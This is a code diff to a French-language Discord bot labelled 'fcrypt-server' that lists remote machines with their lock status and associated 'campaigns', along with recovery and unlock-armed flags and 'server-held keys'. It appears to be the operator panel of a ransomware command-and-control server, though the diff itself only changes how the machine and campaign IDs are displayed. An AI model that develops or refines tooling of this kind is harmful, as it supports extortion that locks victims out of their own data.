@@ -712,15 +712,24 @@ def _discord_bot_main(token: str):
             status = "✅ en ligne" if online else "❌ hors ligne"
             if locked: status += " · 🔒"
             ago = "jamais vu" if not hs else f"vu il y a {_human_delta(now - hs)}"
-            lines = [f"{status} · {ago}"]
-            for cid, cv in campaigns.get(mid, []):
-                cs = cv.get("status", "?")
-                if cv.get("recovery_pending"): cs += " ⏳ rec"
-                if cv.get("unlock_armed"): cs += " 🔓 unlock"
-                lines.append(f"  `{cid[:10]}…` {cs}")
-            fields.append((f"`{mid[:16]}…`", "\n".join(lines), False))
+            
+            lines = [f"**Machine ID** :\n`{mid}`", f"{status} · {ago}"]
+            
+            if campaigns.get(mid):
+                lines.append("**Campagnes :**")
+                for cid, cv in campaigns.get(mid, []):
+                    cs = cv.get("status", "?")
+                    if cv.get("recovery_pending"): cs += " ⏳ rec"
+                    if cv.get("unlock_armed"): cs += " 🔓 unlock"
+                    lines.append(f"`{cid}` ({cs})")
+            else:
+                lines.append("_Aucune campagne enregistrée._")
+                
+            fields.append((" ", "\n".join(lines), False))
+            
         await ctx.send(embed=_embed(f"Machines ({len(mids)})", COL_INFO,
-            f"Option A — server-held keys", fields=fields,
+            f"Option A — server-held keys\n\nClique sur un ID pour le copier.", 
+            fields=fields,
             footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))
 
     @bot.command(name="lock")
